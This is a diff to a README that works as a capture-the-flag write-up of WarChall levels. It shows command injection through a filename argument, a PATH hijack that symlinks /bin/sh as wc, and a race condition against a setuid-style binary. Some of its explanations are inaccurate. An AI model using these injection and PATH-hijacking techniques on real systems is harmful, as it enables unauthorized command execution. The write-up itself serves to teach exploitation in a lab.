@@ -1,7 +1,7 @@
 # Warchall-challenge
 #
 > To start with, I create an SSH account and then connect to the account I've just created by using a terminal.
-## 1. The Beginning
+# 1. The Beginning
 ### For this level we are asked to search for 6 hidden passwords (level 0-5) in various files
 ## *LEVEL 0*
 #### At the very beginning, I display the contents of the WELCOME.md file with the command :
@@ -79,3 +79,66 @@ cd 05_privacy/
 cat README.md
 ```
 ### To sum up, for this challenge we mainly used basic commands to be able to move in folders at different stages, to look at what they contain, even if it's hidden, and to read the contents of a file.
+
+# 2. Choose your Path
+> This is the level 10 mini challenge found in /home/level/10_choose_your_path/
+### in the *10_choose_your_path* folder there is a file named *charp.c* which contains C language source code that counts the number of characters per line in a file. 
+#### Here's the command I used to capture this level's flag:
+``` C
+./charp "solution.txt; cat solution.txt> ~/expected.txt"
+```
+> * **./charp** is a command line instruction for a C program
+> * This command will run the **charp** program with **solution.txt** as an argument and write it's contents to a file named **expected.txt** in  home directory.
+#### After executing this I return go to the home directory :
+```
+cd
+```
+#### And then I open the file containing the flag :
+```
+cat expected.txt
+```
+# 3. Choose your Path II
+>  A level 11 mini challenge found in /home/level/11_choose_your_path2/
+### If you look at what's in the folder *11_choose_your_path2* with the ls command, you'll see that it's similar to the previous level in term of content, but their source code are different.
+### The script contained in charp2.c is also C code. It's escapes single quotes in a string, single quotes are used to enclose the filename when passed to the wc command.
+#### To access to the solution, I used these commands :
+``` 
+ln -s /bin/sh ~/wc
+```
+``` 
+PATH=~ ./charp2 "/bin/cat solution.txt 1>&2"
+```
+> * The **ln** command creates a symbolic link named **wc** in home directory that points to the /bin/sh file.
+> * The charp2 is a C program that reads a command from the standard input and executes it using the shell interpreter.
+> * The PATH environment variable is set to the current directory, and then the charp2 program is executed with the arguments "/bin/cat solution.txt 1>&2".
+> * The "/bin/cat solution.txt 1>&2" argument specifies that the **cat** command should be executed with the *solution.txt* file as input and the output should be redirected to the standard error stream. The 1>&2 redirection operator redirects the standard output stream to the standard error stream.
+# 4. Py-Tong
+> This is the level 12 found in /home/level/12_pytong/
+### how i solved this level?
+* First I created a shell script that I named **test.sh** who uses a while loop to write the string “Contenu 1” to a file I named *new* in an infinite loop :
+```
+ nano test.sh
+```
+```
+ #!/bin/bash
+
+while true; do
+    echo "example" >> new
+
+done
+```
+> * This Bash script use a while loop to write the string “example” to a file named new in an infinite loop.
+> * The script will continue to run until it is manually stopped.
+*Next, I create the file new while still in the home directory :
+```
+touch new
+```
+>la commande **touch**peut être utilisée pour créer un fichier vide sans contenu(avec Linux).
+* Once the empty file has been created, I can use the command to run the script :
+```
+./test.sh
+```
+* At the same time as the script is running, I open another terminal in which I go to the directory /home/level/12_pytong/ where I execute the following command to display the hidden password
+```
+./pytong /home/user/username/new
+```
